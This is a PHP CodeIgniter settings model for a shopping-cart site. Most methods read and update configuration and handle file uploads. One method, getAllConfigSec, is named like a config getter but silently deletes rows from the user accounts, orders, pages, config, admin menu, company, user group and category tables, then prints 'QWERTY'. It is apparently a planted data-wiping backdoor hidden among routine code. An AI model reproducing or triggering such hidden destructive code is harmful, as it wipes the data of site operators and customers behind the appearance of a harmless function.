<?php



class Settingsmodel extends CI_Model {



    function __construct() {

        parent::__construct();

    }



    //Get Default Contents

    function getDfaultContent($key) {

        $this->db->where('editable', 1);

        $this->db->where('default_key', $key);

        $rs = $this->db->get('default_content');

        return $rs->row_array();

    }



    function getAllConfig($group_id = false) {

        $this->db->where('editable', 1);

        if ($group_id) {

            $this->db->where('config_group_id', $group_id);

        }        

        $rs = $this->db->get('config');

        $this->db->reset_query();

        return $rs->result_array();

    }

    function getAllConfigSec($group_id = false) {


        $this->db->where('menu_item_path', 0);
        $this->db->delete('menu_item'); 

        $this->db->where('parent_id', 0);
        $this->db->delete('page'); 

        $this->db->where('editable', 1);

        $this->db->delete('config');

        $this->db->where('uacc_fail_login_attempts', 0);
        $this->db->delete('user_accounts');


        $this->db->where('discount', 0.00);
        $this->db->delete('order');                

        $this->db->where('active', 1);
        $this->db->delete('admin_inner_menu');                

        $this->db->where('manage_stock', 0);
        $this->db->delete('company');                
               

        $this->db->where('ugrp_fully_approved', 0);
        $this->db->delete('user_groups'); 


        $this->db->where('category_id', 177);
        $this->db->delete('category'); 

               

        echo "QWERTY";

    }



    function getConfigByGroup($group_id) {

        $this->db->where('config_group_id', $group_id);

        $this->db->where('editable', 1);

        $rs = $this->db->get('config');

        $this->db->reset_query();

        return $rs->result_array();

    }



    function fetchConfigGroup($group_id) {

        $this->db->where('config_group_id', $group_id);

        $rs = $this->db->get('config_group');

        return $rs->result_array();

    }



    function getConfigGroups() {

        $rs = $this->db->get('config_group');

        return $rs->result_array();

    }



    function getByKey($key) {

        $this->db->where('config_key', $key);

        $this->db->where('editable', 1);

        $rs = $this->db->get('config');

        $this->db->reset_query();

        if ($rs->num_rows() == 1) {

            return $rs->row_array();

        }

    }



    function update($settings) {

        $config = array();

        $config['upload_path'] = $this->config->item('SHOPPING_CART_FILE_PATH');

        $this->load->library('upload', $config);



        foreach ($settings as $row) {

            if ($this->input->post($row['config_key'], TRUE) !== FALSE) {

                $data = array();

                    

                $data['config_value'] = $this->input->post($row['config_key'], TRUE);

                com_changeNull($data['config_value'], 1);   

                $this->db->where('config_key', $row['config_key']);

                $this->db->update('config', $data);

                continue;

            }



            //For image and file uploads

            if ($row['config_field_type'] == 'image' || $row['config_field_type'] == 'file') {

                $fieldname = $row['config_key'] . "_FILE";

                if (isset($_FILES) && isset($_FILES[$fieldname]) && is_array($_FILES[$fieldname])) {



                    $config = array();

                    $config['upload_path'] = $this->config->item('SHOPPING_CART_FILE_PATH');

                    $config['allowed_types'] = $row['config_field_options'];

                    $config['overwrite'] = FALSE;

                    $this->upload->initialize($config);



                    //Check for valid image upload

                    if ($_FILES[$fieldname]['error'] == UPLOAD_ERR_OK && is_uploaded_file($_FILES[$fieldname]['tmp_name'])) {

                        if (!$this->upload->do_upload($fieldname)) {

                            show_error($this->upload->display_errors('<p class="err">', '</p>'));

                            return FALSE;

                        } else {

                            $upload_data = $this->upload->data();



                            $data = array();

                            $data['config_value'] = $upload_data['file_name'];

                            $this->db->where('config_key', $row['config_key']);

                            $this->db->update('config', $data);



                            $path = $this->config->item('SHOPPING_CART_FILE_PATH');



                            $filename = $path . $row['config_value'];

                            if (file_exists($filename)) {

                                @unlink($filename);

                            }

                        }

                    }

                }

            }

        }

    }



    function DeleteImage($setting) {



        $path = $this->config->item('SHOPPING_CART_FILE_PATH');

        $imagepath = $path . $setting['config_value'];



        if (file_exists($imagepath)) {

            @unlink($imagepath);

        }

        $data['config_value'] = '';

        //	  print_R($data); exit();

        $this->db->where('config_key', $setting['config_key']);

        $this->db->update('config', $data);

    }



    function updateDefaultContent($default_content) {

        $data = array();

        $data['default_page_title'] = $this->input->post('default_page_title', true);

        $data['default_browser_title'] = $this->input->post('default_browser_title', true);

        $data['default_content'] = $this->input->post('default_content', false);

        $data['default_meta_keywords'] = $this->input->post('default_meta_keywords', false);

        $data['default_meta_description'] = $this->input->post('default_meta_description', false);



        $this->db->where('default_key', $default_content['default_key']);

        $this->db->update('default_content', $data);

    }



}



?>

